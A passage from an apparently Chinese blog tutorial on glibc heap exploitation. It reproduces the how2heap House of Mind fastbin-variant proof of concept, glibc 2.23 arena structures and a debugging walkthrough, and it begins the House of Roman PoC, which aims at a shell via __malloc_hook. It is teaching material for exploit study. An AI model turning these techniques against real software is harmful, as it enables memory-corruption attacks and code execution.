class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27;</span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x880) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above.</span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size.</span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself.</span></span><br><span class="line"><span class="comment">	In 2.23, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an</span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x28 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs.</span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	<span class="built_in">assert</span>(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>2.23</code>版本和 <code>2.27</code> 以后间 <code>fastbinY[4]</code> 数组的偏移不同，<code>2.23</code> 为 <code>0x38</code> ，<code>2.27</code> 以后加入了 <code>have_fastchunks </code>，需要向后偏移 <code>0x8</code> 字节，即偏移为 <code>0x40</code>。<code>2.23</code> 的<code>malloc_state</code> 及 <code>_heap_info</code> 源码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-15"><a href="#调试-15" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013162104393.png"
                      alt="image-20231013162104393"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013171006999.png"
                      alt="image-20231013171006999"
                ></p>
<p><code>target_loc</code> 位置在 <code>fake_arena_chunk + 0x30</code>  处，也就是 <code>fake_arena_fastbinY[4]</code> 处，因为我们要申请的 <code>fast_chunk</code> 大小为 <code>0x60</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013163308872.png"
                      alt="image-20231013163308872"
                ></p>
<p> <code>system_mem</code> 标识这个 <code>arena</code> 管理的空间大小，请求的内存不能大于 <code>system_mem</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013170335971.png"
                      alt="image-20231013170335971"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172604185.png"
                      alt="image-20231013172604185"
                ></p>
<p>在系统堆初始化之后，将堆的大小定为 <code>0x4000000</code>，因此后面申请的假 <code>arena</code> 管理的地址在这个堆之后，要计算这个堆的起始地址，程序中这个地址为 <code>0x4000000</code>。<code>MAX_SIZE</code> 大小为 <code>0x1ff00 &lt; 0x20000</code>  也就不会触发 <code>mmap</code> 申请机制。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172858520.png"
                      alt="image-20231013172858520"
                ></p>
<p>一直分配 <code>MAX_SIZE</code> 大小的 <code>chunk</code> 直到系统的 <code>main_heap</code> 被申请完。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173848951.png"
                      alt="image-20231013173848951"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173951000.png"
                      alt="image-20231013173951000"
                ></p>
<p>在新的堆区申请 <code>0x60</code> 大小的 <code>fast_chunk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013174809638.png"
                      alt="image-20231013174809638"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175009240.png"
                      alt="image-20231013175009240"
                ></p>
<p><code>fake_heap_info[0]==ar_ptr -&gt; fake_arena</code> 将 <code>ar_ptr</code> 指针指向我们的 <code>fake_arena</code>  ，<code>ar_ptr</code> 指针指向一个为该堆服务的<code>arena</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175140816.png"
                      alt="image-20231013175140816"
                ></p>
<p><code>fastbin_chunk_size = 0x60 | 0x4(0100B)</code> 将 <code>NON_MAIN_ARENA</code> 置为 <code>1</code> ，标明其不在主堆区。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175714934.png"
                      alt="image-20231013175714934"
                ></p>
<p><code>free(fastbin_chunk_fd)</code>  后，将会把它链接到 <code>fake_heap_info_ar_ptr</code> 指向 <code>fake_arena</code> 的 <code>fastbinY[4] (0x60)</code> 处，也就是 <code>0x603448</code> 处。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175937769.png"
                      alt="image-20231013175937769"
                ></p>
<p>此时完成利用成功将目标地址内容写为 <code>fastbin_chunk_prev_addr</code> 。</p>
<h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house_of_roman"></a>house_of_roman</h2><p><code>glibc &lt; 2.29</code></p>
<p>编译选项: <code>gcc -g house_of_roman.c -fpie -pie -ldl -o house_of_roman</code></p>
<p>除了 <code>libc-2.23.so</code> 和 <code>ld-2.23.so</code> 需要 <code>patch</code> 以外，还需要 <code>patch</code> 一下 <code>libdl-2.23.so</code></p>
<p><code>patchelf --replace-needed libdl.so.2 ./libdl-2.23.so house_of_roman</code></p>
<h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">	exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">	done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">	the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">	is done by creating a fastbin bin that looks 